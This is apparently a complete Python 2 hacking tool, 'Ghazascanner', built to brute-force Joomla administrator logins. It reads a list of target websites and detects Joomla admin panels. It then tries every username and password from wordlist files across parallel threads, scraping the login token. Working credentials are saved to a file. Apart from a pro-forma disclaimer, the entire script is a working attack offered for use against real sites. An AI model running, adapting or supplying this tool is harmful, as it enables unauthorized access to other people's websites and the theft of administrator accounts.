# -*- coding: utf-8 -*-
from __future__ import unicode_literals
from random import choice
from string import ascii_lowercase
import requests, re,urllib, urllib2, os, sys, codecs,binascii, json, argparse, codecs, random                     
from multiprocessing.dummy import Pool                             
from time import time as timer    
import time
from time import time as timer
from platform import system  
import urllib
import urllib3
from urllib import urlopen

from Queue import Queue                           
from platform import system
from urlparse import urlparse
from optparse import OptionParser    
from colorama import Fore                                
from colorama import Style                                
from pprint import pprint                                
from colorama import init                                                
import traceback
from bs4 import BeautifulSoup
import subprocess
import warnings
from datetime import datetime
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')                                              
init(autoreset=True) 
fr  =   Fore.RED                                            
fc  =   Fore.CYAN                                            
fw  =   Fore.WHITE                                            
fg  =   Fore.GREEN                                            
sd  =   Style.DIM                                            
sn  =   Style.NORMAL                                        
sb  =   Style.BRIGHT                                        

####################### 
def logo():
    clear = "\x1b[0m"
    colors = [32]

    x = """

       _                                                        
      | |                                                       
  __ _| |__   __ _ ______ _ ___  ___ __ _ _ __  _ __   ___ _ __ 
 / _` | '_ \ / _` |_  / _` / __|/ __/ _` | '_ \| '_ \ / _ \ '__|
| (_| | | | | (_| |/ / (_| \__ \ (_| (_| | | | | | | |  __/ |   
 \__, |_| |_|\__,_/___\__,_|___/\___\__,_|_| |_|_| |_|\___|_|   
  __/ |\033[0;37;41m[WVS v 0.1 Special Joomla Bruteforce]\033[0;40m
 |___/                                                          

    \033[0;37;41m[ Coded by M4L1KL8590X ]
    \033[0;37;41m[ICQ:https://icq.im/greatzcode]
    \033[0;37;41m[Not responsible for any illegal usage of this tool.]
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
logo()
headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
start_raw = raw_input("\n\033[91mGhazascanner\033[97m:~# \033[97m")
crownes = raw_input("\033[91mthread \033[97m\033[97m:~# \033[97m")
try:
    with open(start_raw, 'r') as f:
        ooo = f.read().splitlines()
        ooo = list((ooo))
except IOError:
    print("open your eyes!")
class Ghz(object) :

  def __init__(self, website, verify=False, timeout=10) :
    self.website = website
    self.req = requests.session()
    self.timeout = timeout
def Ghzlist(fil) :
  with open(fil, 'r')  as myfile :
    return myfile.read().split()

def test(url):
    try:
        if 'com_login' in requests.get(url + "/administrator/index.php", verify=False, timeout=10,headers=headers).text.encode('utf-8'):
            
            userlist = Ghzlist('user.txt')
            GhzRun(url,userlist)
        else:
            print sd+fg+'[Target]: '+url+' =====>  Not Joomla'.format(sd,fg,url)
    except Exception as e:
        print '{}{}[Target]: {} =====>  Contact M4L1KL8590X'.format(sd,fg,str(e))
def GhzRun(url,user):
    try:

        print sd+fg+'[Target]: '+url+' =====>  Joomla'.format(sd,fg,url)
        
        for us in user:

            Ghzlogin = requests.session()
            fd=open('pass.txt','r')
            try:
                for line in fd.readlines():
                    passwd = line.strip()
                    try:


                        Ghzlogins = Ghzlogin.get(url + '/administrator/index.php',timeout=7)

                        token = re.findall('type="hidden" name="(.*?)" value="1"', Ghzlogins.text)

                        GhzToken = {'username': us,
                                   'passwd': passwd,
                                   token[0]: '1',
                                   'lang': 'en-GB',
                                   'option': 'com_login',
                                   'task': 'login',
                                   'return': 'aW5kZXgucGhw'}

                        Ghzlogin2 = Ghzlogin.post(url + '/administrator/index.php', data=GhzToken, headers=headers,timeout=7)

                        if 'logout' in Ghzlogin2.content:
                            try:
                                
                                print '{}{}[Target]: {} =====>  Joomla       | {} | {} {} | Login Success |'.format(sb,fg,url,us,str(passwd),fg)
                                open('goodds.txt', 'a').write(url+'/administrator/index.php|'+us+'|'+str(passwd)+"\n")
                                sys.exit()
                            except Exception as e:
                                print '{}{}[Target]: {} =====>  Contact M4L1KL8590X'.format(sd,fg,str(e))
                        else:
                            print '{}{}[Target]: {} =====>  Joomla       | {} | {} {} | Login Failed |'.format(sb,fg,url,us,fr,str(passwd))
                    except Exception as e:
                        print '{}{}[Target]: {} =====>  Contact M4L1KL8590X'.format(sd,fg,str(e))
            except Exception as e:
                print '{}{}[Target]: {} =====>  Contact M4L1KL8590X'.format(sd,fg,str(e))
    except Exception as e:
        print '{}{}[Target]: {} =====>  Contact M4L1KL8590X'.format(sd,fg,str(e))
def MyLove(url):
    
    try:
        if 'http' not in url:
            site = 'http://'+url
            url = 'http://'+url
            
            test(site)

        else:
            site = url
            if "https://" in site:
                site = site.replace("http://","https://")
                test(site)
            else:
                test(site)
    except:
        print '{}{}[Target]: {} =====>  Contact M4L1KL8590X'.format(sd,fg,url)

    
def Main():
    try:
        
        start = timer()
        ThreadPool = Pool(int(crownes))
        Threads = ThreadPool.map(MyLove, ooo)
    except:
        print '{}{}[Target]: {} =====>  Contact M4L1KL8590X'.format(sd,fg,url)


if __name__ == '__main__':
    Main()